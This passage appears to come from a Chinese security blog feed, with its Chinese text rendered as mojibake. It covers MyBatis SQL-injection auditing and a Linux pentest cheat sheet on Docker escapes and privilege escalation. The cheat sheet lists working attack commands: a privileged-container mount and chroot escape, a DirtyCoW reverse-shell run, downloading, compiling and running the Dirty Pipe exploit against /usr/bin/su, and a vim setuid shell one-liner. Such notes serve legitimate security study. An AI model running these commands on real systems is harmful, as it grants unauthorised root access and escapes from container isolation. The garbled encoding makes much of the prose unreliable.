title="è§‚å¯Ÿé¡¹ç›®ä½¿ç”¨äº†å“ªä¸€ç§æ–¹æ³•æ¥æ“ä½œæ•°æ®åº“"></a>è§‚å¯Ÿé¡¹ç›®ä½¿ç”¨äº†å“ªä¸€ç§æ–¹æ³•æ¥æ“ä½œæ•°æ®åº“</h2><p>ä»<code>POM.XML</code>ä¸­å¯ä»¥çœ‹åˆ°ä½¿ç”¨äº†Mybatisæ¡†æ¶</p><p><img src="/../images/image-20231026154200895.png" alt="image-20231026154200895"></p><h2 id="æœç´¢ç›¸å…³å…³é”®è¯ï¼Œæ‰¾åˆ°å¯èƒ½å­˜åœ¨çš„ç‚¹"><a href="#æœç´¢ç›¸å…³å…³é”®è¯ï¼Œæ‰¾åˆ°å¯èƒ½å­˜åœ¨çš„ç‚¹" class="headerlink" title="æœç´¢ç›¸å…³å…³é”®è¯ï¼Œæ‰¾åˆ°å¯èƒ½å­˜åœ¨çš„ç‚¹"></a>æœç´¢ç›¸å…³å…³é”®è¯ï¼Œæ‰¾åˆ°å¯èƒ½å­˜åœ¨çš„ç‚¹</h2><p>å¦‚Mybatisæ¡†æ¶å°±æœç´¢<code>$&#123;</code>ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œå› ä¸ºæ˜¯likeæ¨¡ç³ŠæŸ¥è¯¢æ‰€ä»¥ä½¿ç”¨äº†<code>$&#123;&#125;</code>æ¥è¿›è¡Œæ‹¼æ¥</p><p><img src="/../images/image-20231026154322869.png" alt="image-20231026154322869"></p><h2 id="é€†å‘è¿½è¸ªæ‹¼æ¥çš„å‚æ•°ä¼ å…¥è¿‡ç¨‹ï¼Œé€†å‘è¿½è¸ªå‚æ•°çš„è·¯å¾„å¤§è‡´ä¸ºMapper-gt-Dao-gt-ServiceImpl-gt-Controller"><a href="#é€†å‘è¿½è¸ªæ‹¼æ¥çš„å‚æ•°ä¼ å…¥è¿‡ç¨‹ï¼Œé€†å‘è¿½è¸ªå‚æ•°çš„è·¯å¾„å¤§è‡´ä¸ºMapper-gt-Dao-gt-ServiceImpl-gt-Controller" class="headerlink" title="é€†å‘è¿½è¸ªæ‹¼æ¥çš„å‚æ•°ä¼ å…¥è¿‡ç¨‹ï¼Œé€†å‘è¿½è¸ªå‚æ•°çš„è·¯å¾„å¤§è‡´ä¸ºMapper -&gt; Dao -&gt; ServiceImpl -&gt; Controller"></a>é€†å‘è¿½è¸ªæ‹¼æ¥çš„å‚æ•°ä¼ å…¥è¿‡ç¨‹ï¼Œé€†å‘è¿½è¸ªå‚æ•°çš„è·¯å¾„å¤§è‡´ä¸º<code>Mapper -&gt; Dao -&gt; ServiceImpl -&gt; Controller</code></h2><p>æœç´¢å¾—åˆ°æœ‰ä¸¤å¤„æŸ¥è¯¢ä½¿ç”¨äº†<code>$&#123;&#125;</code>æ¥è¿›è¡Œæ‹¼æ¥</p><p><img src="/../images/image-20231026160243330.png" alt="image-20231026160243330"></p><p><img src="/../images/image-20231026160308494.png" alt="image-20231026160308494"></p><p>é€šè¿‡<code>namespace</code>å¯ä»¥æ‰¾åˆ°å¯¹åº”çš„<code>Dao</code></p><p><img src="/../images/image-20231026160357396.png" alt="image-20231026160357396"></p><p>åœ¨<code>Dao</code>ä¸­æ‰¾åˆ°å¯¹åº”æ–¹æ³•ï¼Œ</p><p><img src="/../images/image-20231026160600815.png" alt="image-20231026160600815"></p><p><code>find usages</code>è·³è½¬åˆ°å¯¹åº”å®ç°</p><p><img src="/../images/image-20231026160811957.png" alt="image-20231026160811957"></p><p>å†æ¬¡è¿½è¸ªè¯¥æ–¹æ³•è°ƒç”¨ï¼Œæ¥åˆ°<code>Crontroller</code>å±‚</p><p><img src="/../images/image-20231026160856177.png" alt="image-20231026160856177"></p><p>æ‰€å±ç±»</p><p><img src="/../images/image-20231026161030565.png" alt="image-20231026161030565"></p><p>æ‰€ä»¥æœ‰å¦‚ä¸‹è¯·æ±‚</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">/admin/goods/list?page=xx&amp;limit=xx&amp;goodsName=</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨sqlmapéªŒè¯</p><p><img src="/../images/image-20231026171348504.png" alt="image-20231026171348504"></p><p>å¦ä¸€å¤„ä¹Ÿæ˜¯å¦‚æ­¤åˆ†æ</p><p><img src="/../images/image-20231026171528715.png" alt="image-20231026171528715"></p><h2 id="æ€»ç»“-1"><a href="#æ€»ç»“-1" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æœ¬æ¬¡è¾ƒä¸ºç®€å•ï¼Œå› ä¸ºæ²¡æœ‰è¿‡æ»¤çš„å­˜åœ¨ï¼Œä¸»è¦æ˜¯å­¦ä¹ å¦‚ä½•å¯»æ‰¾ä»¥åŠæ•°æ®çš„æµå‘ã€‚</p><p>é‚£ä¹ˆå¯¹äºSQLæ³¨å…¥çš„å®¡è®¡ï¼Œå¦‚Mybatisæ¡†æ¶å…ˆåœ¨Mapperä¸­æœå¯»æ˜¯å¦å­˜åœ¨<code>$&#123;&#125;</code>æ‹¼æ¥çš„æƒ…å†µï¼Œå°¤å…¶æ³¨æ„order byã€group byã€likeã€inã€‚æ‰¾åˆ°æ‹¼æ¥åå†é€†å‘è¿½è¸ªå‚æ•°ï¼Œåˆ¤æ–­å‚æ•°æ˜¯å¦å¯æ§ï¼Œæ˜¯å¦æ˜¯å­—ç¬¦ç±»å‹ï¼Œæ£€æŸ¥æ˜¯å¦å­˜åœ¨è¿‡æ»¤å™¨è¿‡æ»¤SQLå­—ç¬¦ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linuxæ¸—é€æ€»ç»“</title>
      <link href="/2023/10/15/Linux%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
      <url>/2023/10/15/Linux%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="å®¹å™¨é€ƒé€¸"><a href="#å®¹å™¨é€ƒé€¸" class="headerlink" title="å®¹å™¨é€ƒé€¸"></a>å®¹å™¨é€ƒé€¸</h1><h2 id="å¦‚ä½•åˆ¤æ–­æ˜¯å¦åœ¨dockerå®¹å™¨å†…"><a href="#å¦‚ä½•åˆ¤æ–­æ˜¯å¦åœ¨dockerå®¹å™¨å†…" class="headerlink" title="å¦‚ä½•åˆ¤æ–­æ˜¯å¦åœ¨dockerå®¹å™¨å†…"></a>å¦‚ä½•åˆ¤æ–­æ˜¯å¦åœ¨dockerå®¹å™¨å†…</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -al /.dockerenv</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230901114550082.png?lastModify=1695029992" alt="image-20230901114550082"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/1/cgroup</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230901114605623.png?lastModify=1695029992" alt="image-20230901114605623"></p><p>dockerå®¹å™¨é€ƒé€¸æ£€æµ‹è„šæœ¬<a href="https://github.com/teamssix/container-escape-check">teamssix&#x2F;container-escape-check: docker container escape check || Docker å®¹å™¨é€ƒé€¸æ£€æµ‹ (github.com)</a></p><h2 id="å¸¸è§é€ƒé€¸æ–¹æ³•"><a href="#å¸¸è§é€ƒé€¸æ–¹æ³•" class="headerlink" title="å¸¸è§é€ƒé€¸æ–¹æ³•"></a>å¸¸è§é€ƒé€¸æ–¹æ³•</h2><p><a href="http://124.220.192.120:7777/CloudNative/Docker/">Docker ä»‹ç» | T Wiki</a></p><h3 id="Docker-Remote-API-æœªæˆæƒé€ƒé€¸"><a href="#Docker-Remote-API-æœªæˆæƒé€ƒé€¸" class="headerlink" title="Docker Remote API æœªæˆæƒé€ƒé€¸"></a>Docker Remote API æœªæˆæƒé€ƒé€¸</h3><p>docker remote apiå¯ä»¥æ‰§è¡Œdockerå‘½ä»¤ï¼Œdockerå®ˆæŠ¤è¿›ç¨‹ç›‘å¬åœ¨0.0.0.0ï¼Œå¯ç›´æ¥è°ƒç”¨APIæ¥æ“ä½œdockerã€‚</p><p><img src="/../images/image-20231023182901150.png" alt="image-20231023182901150"></p><p><img src="/../images/image-20231023182819832.png" alt="image-20231023182819832"></p><h3 id="Privileged-ç‰¹æƒæ¨¡å¼å®¹å™¨é€ƒé€¸"><a href="#Privileged-ç‰¹æƒæ¨¡å¼å®¹å™¨é€ƒé€¸" class="headerlink" title="Privileged ç‰¹æƒæ¨¡å¼å®¹å™¨é€ƒé€¸"></a>Privileged ç‰¹æƒæ¨¡å¼å®¹å™¨é€ƒé€¸</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo docker run -itd --privileged ubuntu:latest /bin/bash <span class="comment"># ä½¿ç”¨ç‰¹æƒæ¨¡å¼å¯åŠ¨å®¹å™¨</span></span><br><span class="line">fdisk -l <span class="comment"># æŸ¥çœ‹ç£ç›˜æ–‡ä»¶</span></span><br><span class="line"><span class="built_in">mkdir</span> /tmp/test <span class="comment"># åˆ›å»ºæŒ‚è½½ç›®å½•</span></span><br><span class="line">mount /dev/sda1 /tmp/test <span class="comment"># å°†å®¿ä¸»æœºç£ç›˜æŒ‚è½½åˆ°æŒ‚è½½ç›®å½•</span></span><br><span class="line"><span class="built_in">chroot</span> /tmp/test <span class="comment"># åˆ‡æ¢æ ¹ç›®å½•</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231023183310012.png" alt="image-20231023183310012"></p><p><img src="/../images/image-20231023183617812.png" alt="image-20231023183617812"></p><h3 id="æ•æ„Ÿç›®å½•æŒ‚è½½é€ƒé€¸"><a href="#æ•æ„Ÿç›®å½•æŒ‚è½½é€ƒé€¸" class="headerlink" title="æ•æ„Ÿç›®å½•æŒ‚è½½é€ƒé€¸"></a>æ•æ„Ÿç›®å½•æŒ‚è½½é€ƒé€¸</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">df</span> <span class="comment"># æ˜¾ç¤ºæ–‡ä»¶ç³»ç»Ÿçš„ç£ç›˜ç©ºé—´ä½¿ç”¨æƒ…å†µï¼ŒåŒ…æ‹¬æ–‡ä»¶ç³»ç»Ÿçš„æŒ‚è½½ç‚¹</span></span><br></pre></td></tr></table></figure><p>ä»¥æŒ‚è½½äº†å®¿ä¸»æœº<code>/root</code>åˆ°å®¹å™¨<code>/root</code>ä¸ºä¾‹</p><p><img src="/../images/image-20231023185041650.png" alt="image-20231023185041650"></p><h3 id="å®¿ä¸»æœºå†…æ ¸æ¼æ´å¯¼è‡´é€ƒé€¸"><a href="#å®¿ä¸»æœºå†…æ ¸æ¼æ´å¯¼è‡´é€ƒé€¸" class="headerlink" title="å®¿ä¸»æœºå†…æ ¸æ¼æ´å¯¼è‡´é€ƒé€¸"></a>å®¿ä¸»æœºå†…æ ¸æ¼æ´å¯¼è‡´é€ƒé€¸</h3><p><a href="https://blog.wohin.me/posts/dirtycow-for-escape/">CVE-2016-5195å®éªŒï¼šDirtyCoWä¸Dockeré€ƒé€¸ (wohin.me)</a></p><p>Pyaloadï¼š<a href="https://github.com/scumjr/dirtycow-vdso">scumjr&#x2F;dirtycow-vdso: PoC for Dirty COW (CVE-2016-5195) (github.com)</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make</span><br><span class="line">./0xdeadbeef 172.18.0.2:10000</span><br></pre></td></tr></table></figure><p><strong>ç”±äºæœ€åè·å¾—çš„äº‹å®ä¸Šæ˜¯ä¸€ä¸ªåå¼¹shellï¼Œæ‰€ä»¥è¦ç»™å‡ºåå¼¹çš„IPå’Œç«¯å£ã€‚ç«¯å£å¯ä»¥éšæ„è®¾ç½®ï¼ŒIPå¯ä»¥ç”¨<code>ifconfig</code>æŸ¥çœ‹ã€‚</strong></p><p><img src="/../images/FE062CE3-C428-4889-ABF2-3423CB1D9D28.png" alt="FE062CE3-C428-4889-ABF2-3423CB1D9D28"></p><p><img src="/../images/5B633EA1-A558-4DE2-A2D5-6A1ED2DD6412.png" alt="5B633EA1-A558-4DE2-A2D5-6A1ED2DD6412"></p><p><img src="/../images/0E89C848-0E3B-4AFD-B035-F8D46CE032F3.png" alt="0E89C848-0E3B-4AFD-B035-F8D46CE032F3"></p><h2 id="é›†æˆå·¥å…·"><a href="#é›†æˆå·¥å…·" class="headerlink" title="é›†æˆå·¥å…·"></a>é›†æˆå·¥å…·</h2><p><a href="https://github.com/cdk-team/CDK/wiki/CDK-Home-CN">CDK Home CN Â· cdk-team&#x2F;CDK Wiki (github.com)</a></p><p>CDKåŒ…æ‹¬ä¸‰ä¸ªåŠŸèƒ½æ¨¡å—</p><ol><li>Evaluate: å®¹å™¨å†…éƒ¨ä¿¡æ¯æ”¶é›†ï¼Œä»¥å‘ç°æ½œåœ¨çš„å¼±ç‚¹ä¾¿äºåç»­åˆ©ç”¨ã€‚</li><li>Exploit: æä¾›å®¹å™¨é€ƒé€¸ã€æŒä¹…åŒ–ã€æ¨ªå‘ç§»åŠ¨ç­‰åˆ©ç”¨æ–¹å¼ã€‚</li><li>Tool: ä¿®å¤æ¸—é€è¿‡ç¨‹ä¸­å¸¸ç”¨çš„linuxå‘½ä»¤ä»¥åŠä¸Docker&#x2F;K8s APIäº¤äº’çš„å‘½ä»¤ã€‚</li></ol><h2 id="è¡¥å……"><a href="#è¡¥å……" class="headerlink" title="è¡¥å……"></a>è¡¥å……</h2><p><a href="https://github.com/teamssix/awesome-cloud-security">teamssix&#x2F;awesome-cloud-security: awesome cloud security æ”¶é›†ä¸€äº›å›½å†…å¤–ä¸é”™çš„äº‘å®‰å…¨èµ„æºï¼Œè¯¥é¡¹ç›®ä¸»è¦é¢å‘å›½å†…çš„å®‰å…¨äººå‘˜ (github.com)</a><a href="https://github.com/source-xu/docker-vuls">https://github.com/source-xu/docker-vuls</a>)</p><p><a href="https://www.freebuf.com/articles/es/377292.html">ä¸€ä¸ªæœªå…¬å¼€çš„å®¹å™¨é€ƒé€¸æ–¹å¼ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><h1 id="Linuxææƒ"><a href="#Linuxææƒ" class="headerlink" title="Linuxææƒ"></a>Linuxææƒ</h1><h2 id="è¾…åŠ©å·¥å…·"><a href="#è¾…åŠ©å·¥å…·" class="headerlink" title="è¾…åŠ©å·¥å…·"></a>è¾…åŠ©å·¥å…·</h2><h3 id="GTFOBins"><a href="#GTFOBins" class="headerlink" title="GTFOBins"></a><strong><a href="https://gtfobins.github.io/">GTFOBins</a></strong></h3><p>GTFOBinsæ˜¯ä¸€ä¸ªç²¾å¿ƒç­–åˆ’çš„UnixäºŒè¿›åˆ¶æ–‡ä»¶åˆ—è¡¨ï¼Œå¯ä»¥ç”¨æ¥ç»•è¿‡é”™è¯¯é…ç½®ç³»ç»Ÿä¸­çš„æœ¬åœ°å®‰å…¨é™åˆ¶ã€‚è¯¥é¡¹ç›®æ”¶é›†äº†UnixäºŒè¿›åˆ¶æ–‡ä»¶çš„åˆæ³•å‡½æ•°ï¼Œè¿™äº›å‡½æ•°å¯èƒ½è¢«æ»¥ç”¨ï¼Œä»¥æ‰“ç ´å—é™åˆ¶çš„shellï¼Œå‡çº§æˆ–ç»´æŠ¤æå‡çš„ç‰¹æƒï¼Œä¼ è¾“æ–‡ä»¶ï¼Œç”Ÿæˆç»‘å®šå’Œåå‘shellï¼Œå¹¶ä¸ºå…¶ä»–äº‹ååˆ©ç”¨ä»»åŠ¡æä¾›ä¾¿åˆ©ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸æ˜¯ä¸€ä¸ªæ¼æ´åˆ—è¡¨ï¼Œè¿™é‡Œåˆ—å‡ºçš„ç¨‹åºæœ¬èº«å¹¶ä¸å®¹æ˜“å—åˆ°æ”»å‡»ï¼Œç›¸åï¼Œ<strong>GTFOBinsæ˜¯ä¸€ä¸ªæ¦‚è¦ï¼Œè¯´æ˜å½“æ‚¨åªæœ‰æŸäº›äºŒè¿›åˆ¶æ–‡ä»¶å¯ç”¨æ—¶ï¼Œå¦‚ä½•è·å¾—rootæƒé™</strong>ã€‚</p><h3 id="beroot"><a href="#beroot" class="headerlink" title="beroot"></a><strong>beroot</strong></h3><p>BeRootç”¨äºæ£€æŸ¥Linuxå’ŒMac OSä¸Šå¸¸è§çš„é”™è¯¯é…ç½®ï¼Œä»¥æ‰¾åˆ°ä¸€ç§æ–¹æ³•æ¥å‡çº§æˆ‘ä»¬çš„ç‰¹æƒã€‚æ£€æŸ¥é¡¹åŒ…æ‹¬GTFOBinsä¸­çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€é€šé…ç¬¦é”™è¯¯ã€suidã€ç¯å¢ƒå˜é‡ã€NFSã€sudoç­‰ç­‰</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python2 beroot.py</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231015201659431.png" alt="image-20231015201659431"></p><p><img src="/../images/image-20231015201711821.png" alt="image-20231015201711821"></p><p><img src="/../images/image-20231015201721586.png" alt="image-20231015201721586"></p><h3 id="Linepeasâ€“ä¸åªæ˜¯ææƒ"><a href="#Linepeasâ€“ä¸åªæ˜¯ææƒ" class="headerlink" title="Linepeasâ€“ä¸åªæ˜¯ææƒ"></a><strong>Linepeasâ€“ä¸åªæ˜¯ææƒ</strong></h3><p>LinPEAS æ˜¯ä¸€ä¸ªè„šæœ¬ï¼Œç”¨äºæœç´¢åœ¨ Linux&#x2F;Unix*&#x2F;MacOS ä¸»æœºä¸Šæå‡æƒé™çš„å¯èƒ½è·¯å¾„ã€‚</p><p><a href="https://www.ddosi.org/peass-ng/">PEASS-ng Windows&#x2F;linux&#x2F;unix*&#x2F;macOSææƒå·¥å…· - ğŸ”°é›¨è‹â„’ğŸ”° (ddosi.org)</a></p><h3 id="pspyâ€“è¿›ç¨‹ç›‘æ§"><a href="#pspyâ€“è¿›ç¨‹ç›‘æ§" class="headerlink" title="pspyâ€“è¿›ç¨‹ç›‘æ§"></a><strong>pspy</strong>â€“è¿›ç¨‹ç›‘æ§</h3><p>Pspyæ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨äºåœ¨ä¸éœ€è¦rootæƒé™çš„æƒ…å†µä¸‹çª¥æ¢è¿›ç¨‹ã€‚è¯¥å·¥å…·é€šå…³å¾ªç¯éå†&#x2F;procä¸‹çš„å€¼æ¥è·å–è¿›ç¨‹å‚æ•°ä¿¡æ¯ã€‚æ¯”å¦‚è¯´æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ä¸€äº›å®šæ—¶ä»»åŠ¡è¿›ç¨‹æˆ–å…¶ä»–å¯ç–‘è¿›ç¨‹æ¥å°è¯•ææƒ</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./pspy64</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231015201909328.png" alt="image-20231015201909328"></p><h3 id="traiorâ€“è‡ªåŠ¨åŒ–ææƒğŸ‚"><a href="#traiorâ€“è‡ªåŠ¨åŒ–ææƒğŸ‚" class="headerlink" title="traiorâ€“è‡ªåŠ¨åŒ–ææƒğŸ‚"></a>traiorâ€“è‡ªåŠ¨åŒ–ææƒğŸ‚</h3><p>å¤šä¸ªlinuxææƒæ¼æ´ç¼åˆæ€ªï¼Œè¿è¡Œåä¼šç»™å‡ºææƒæ–¹æ³•ï¼Œå¹¶å†…ç½®äº†expå¯ä»¥ç›´æ¥ä½¿ç”¨</p><p><img src="/../images/image-20231015202209167.png" alt="image-20231015202209167"></p><p><img src="/../images/image-20231015202355175.png" alt="image-20231015202355175"></p><p><img src="/../images/image-20231015202422512.png" alt="image-20231015202422512"></p><h2 id="å¸¸è§ææƒæ‰‹æ³•"><a href="#å¸¸è§ææƒæ‰‹æ³•" class="headerlink" title="å¸¸è§ææƒæ‰‹æ³•"></a>å¸¸è§ææƒæ‰‹æ³•</h2><h3 id="å†…æ ¸ææƒ"><a href="#å†…æ ¸ææƒ" class="headerlink" title="å†…æ ¸ææƒ"></a>å†…æ ¸ææƒ</h3><p>å¼ºè°ƒåˆ©ç”¨å†…æ ¸æ¼æ´çš„å‡ ä¸ª<strong>æ³¨æ„ç‚¹</strong>ï¼š</p><ol><li>è¯»æºç æ³¨é‡Šï¼Œæœ‰expåŸºæœ¬ä¿¡æ¯å’Œç¼–è¯‘æ–¹æ³•ï¼Œä¸ç„¶å¯èƒ½è¿ç¼–è¯‘éƒ½ä¸ä¼š</li><li>è¯»æºç ï¼Œä¸ç„¶è´¹åŠ²ç¼–è¯‘å®Œæ‰å‘ç°ä¸é€‚ç”¨</li><li>è¯»æºç ï¼Œä¸ç„¶é‡åˆ°ä¸€ä¸ªåˆ å…¨ç›˜çš„â€expâ€œæ€ä¹ˆåŠ</li><li>é‡åˆ°æ²¡æœ‰gccçš„å‘çˆ¹æœåŠ¡å™¨ã€‚è¿™æ—¶æˆ‘ä»¬å°±éœ€è¦åœ¨æœ¬åœ°ç¼–è¯‘ã€‚æœ¬åœ°ç¼–è¯‘æ—¶ä¸æ­¢è¦çœ‹expæºç æ³¨é‡Šçš„ç¼–è¯‘å‚æ•°ï¼Œä¹Ÿéœ€è¦æ‰‹åŠ¨è°ƒæ•´ä¸€ä¸‹ç¼–è¯‘çš„å‚æ•°ï¼Œæ¯”å¦‚ç»™gcc åŠ -m 32æ¥ç¼–è¯‘32ä½ã€‚ç¼–è¯‘é—®é¢˜ç¹å¤šï¼Œæœ‰å›°éš¾æ‰¾è°·æ­Œã€‚</li></ol><ul><li><p><strong>è„ç‰›æ¼æ´ï¼ˆCVE-2016-5195ï¼‰</strong></p><blockquote><p>æ¼æ´åŸç†ï¼šè¯¥æ¼æ´å…·ä½“ä¸ºï¼Œget_user_pageå†…æ ¸å‡½æ•°åœ¨å¤„ç†<strong>Copy-on-Write</strong>(ä»¥ä¸‹ä½¿ç”¨COWè¡¨ç¤º)çš„è¿‡ç¨‹ä¸­ï¼Œå¯èƒ½äº§å‡ºç«æ€æ¡ä»¶é€ æˆCOWè¿‡ç¨‹è¢«ç ´åï¼Œå¯¼è‡´å‡ºç°å†™æ•°æ®åˆ°è¿›ç¨‹åœ°å€ç©ºé—´å†…åªè¯»å†…å­˜åŒºåŸŸçš„æœºä¼šã€‚<strong>ä¿®æ”¹suæˆ–è€…passwdç¨‹åº</strong>å°±å¯ä»¥è¾¾åˆ°rootçš„ç›®çš„ã€‚</p></blockquote><p><a href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs">PoCs Â· dirtycow&#x2F;dirtycow.github.io Wiki</a></p></li><li><p><strong>Dirty Pipe(CVE-2022-0847)</strong></p><ul><li><p><a href="https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit">https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit</a></p><p>è¦†ç›– &#x2F;etc&#x2F;passwd ä¸­çš„ root å¯†ç å­—æ®µå¹¶åœ¨å¼¹å‡º root shell åæ¢å¤</p></li><li><p><a href="https://haxx.in/files/dirtypipez.c">https://haxx.in/files/dirtypipez.c</a></p><p>ç›´æ¥ä¿®æ”¹ä¸€ä¸ªå…·æœ‰suidæƒé™çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œç„¶åæ‰§è¡Œè¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ææƒï¼Œå®Œæˆææƒåå†æŠŠæ–‡ä»¶æ”¹å›æ¥</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://haxx.in/files/dirtypipez.c</span><br><span class="line">gcc -o dirtypipez dirtypipez.c</span><br><span class="line">./dirtypipez /usr/bin/su  <span class="comment">#ä»»ä½•å…·ä½“suidæƒé™çš„æ–‡ä»¶å‡å¯</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231015204347541.png" alt="image-20231015204347541"></p></li></ul></li></ul><h3 id="Dockerææƒ"><a href="#Dockerææƒ" class="headerlink" title="Dockerææƒ"></a>Dockerææƒ</h3><ul><li><p>ä»è„ç®¡é“ï¼ˆCVE-2022-0847ï¼‰åˆ° Docker é€ƒé€¸</p><p><img src="/../images/image-20231015202422512.png?lastModify=1697447453" alt="image-20231015202422512"></p></li><li><p>CVE-2022-23222â€“ä¸ç¨³å®š</p><p>å½±å“ç‰ˆæœ¬ï¼š5.8.0 &lt;&#x3D; Linux å†…æ ¸ &lt;&#x3D; 5.16</p><p><a href="https://github.com/tr3ee/CVE-2022-23222.git">https://github.com/tr3ee/CVE-2022-23222.git</a></p></li><li><p>Docker ç”¨æˆ·ç»„ææƒ</p><p><a href="http://124.220.192.120:7777/CloudNative/Docker/docker-user-group-privilege-escalation.html">Docker ç”¨æˆ·ç»„ææƒ | T Wiki</a></p></li></ul><h3 id="suidææƒ"><a href="#suidææƒ" class="headerlink" title="suidææƒ"></a>suidææƒ</h3><p><a href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html">è°ˆä¸€è°ˆLinuxä¸suidææƒ | ç¦»åˆ«æ­Œ (leavesongs.com)</a></p><p><img src="/../images/image-20230220142509956.png" alt="image-20230220142509956"></p><blockquote><p>suidå…¨ç§°æ˜¯<strong>S</strong>et owner <strong>U</strong>ser <strong>ID</strong> up on executionã€‚è¿™æ˜¯Linuxç»™å¯æ‰§è¡Œæ–‡ä»¶çš„ä¸€ä¸ªå±æ€§ã€‚</p><p>è®¾ç½®äº†sä½çš„ç¨‹åºåœ¨è¿è¡Œæ—¶ï¼Œå…¶<strong>Effective UID</strong>å°†ä¼šè®¾ç½®ä¸ºè¿™ä¸ªç¨‹åºçš„æ‰€æœ‰è€…ã€‚æ¯”å¦‚ï¼Œ<code>/bin/ping</code>è¿™ä¸ªç¨‹åºçš„æ‰€æœ‰è€…æ˜¯0ï¼ˆrootï¼‰ï¼Œå®ƒè®¾ç½®äº†sä½ï¼Œé‚£ä¹ˆæ™®é€šç”¨æˆ·åœ¨è¿è¡Œpingæ—¶å…¶<strong>Effective UID</strong>å°±æ˜¯0ï¼Œç­‰åŒäºæ‹¥æœ‰äº†rootæƒé™ã€‚</p></blockquote><p><img src="/../images/image-20230220142233418.png" alt="image-20230220142233418"></p><p>æŸ¥æ‰¾å…·æœ‰sä½æƒé™çš„å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;</span><br></pre></td></tr></table></figure><p>å¸¸è§suidææƒå‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find . -exec command \;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./vim -c &#x27;:python3 import os; os.setuid(0); os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;reset; exec sh&quot;)&#x27;</span><br></pre></td></tr></table></figure><h3 id="sudoææƒ"><a href="#sudoææƒ" class="headerlink" title="sudoææƒ"></a>sudoææƒ</h3><blockquote><p>sudoï¼šsuper user do</p></blockquote><h4 id="ä¸æ°å½“çš„sudoå‘½ä»¤é…ç½®"><a href="#ä¸æ°å½“çš„sudoå‘½ä»¤é…ç½®" class="headerlink" title="ä¸æ°å½“çš„sudoå‘½ä»¤é…ç½®"></a>ä¸æ°å½“çš„sudoå‘½ä»¤é…ç½®</h4><p>åŸç†ï¼š</p><p>åœ¨<strong>äº¤äº’æ¨¡å¼</strong>ä»¥åŠ<strong>æ— å¯†ç </strong>æƒ…å†µä¸‹ï¼ˆçŸ¥é“å¯†ç ç›´æ¥åˆ‡æ¢ä¸ºrootç”¨æˆ·å°±å¥½äº†ï¼‰å¯ä»¥ä½¿ç”¨<code>sudo -l</code>æŸ¥æ‰¾å“ªäº›å‘½ä»¤å¯ä»¥ä»¥rootæƒé™æ‰§è¡Œï¼Œä½¿ç”¨è¿™äº›å‘½ä»¤åˆ›å»ºä¸€ä¸ªæ–°shellå³å¯ææƒ</p><p><img src="/../images/image-20230220161114377.png" alt="image-20230220161114377"></p><p><img src="/../images/image-20230220161140688.png" alt="image-20230220161140688"></p><p>åœ¨viçš„ESCæ¨¡å¼ä¸‹è¾“å…¥<code>!/bin/bash</code>åæŒ‰ä¸‹å›è½¦å³å¯å˜ä¸ºrootæƒé™ã€‚</p><h4 id="Linux-sudoæƒé™æå‡æ¼æ´ï¼ˆCVE-2021-3156ï¼‰â€“-æˆåŠŸç‡é«˜"><a href="#Linux-sudoæƒé™æå‡æ¼æ´ï¼ˆCVE-2021-3156ï¼‰â€“-æˆåŠŸç‡é«˜" class="headerlink" title="Linux sudoæƒé™æå‡æ¼æ´ï¼ˆCVE-2021-3156ï¼‰â€“ æˆåŠŸç‡é«˜"></a>Linux sudoæƒé™æå‡æ¼æ´ï¼ˆCVE-2021-3156ï¼‰â€“ æˆåŠŸç‡é«˜</h4><p><strong>æŸ¥çœ‹sudoç‰ˆæœ¬</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo --version</span><br></pre></td></tr></table></figure><p><strong>ç‰ˆæœ¬å½±å“</strong></p><ul><li><p>sudo 1.8.2 - 1.8.31p2</p></li><li><p>sudo 1.9.0 - 1.9.5p1</p></li></ul><p><strong>ç®€å•åˆ¤æ–­æ–¹æ³•</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudoedit -s /</span><br></pre></td></tr></table></figure><blockquote><p>å¦‚æœæ˜¾ç¤ºsudoedit: &#x2F;: not a regular 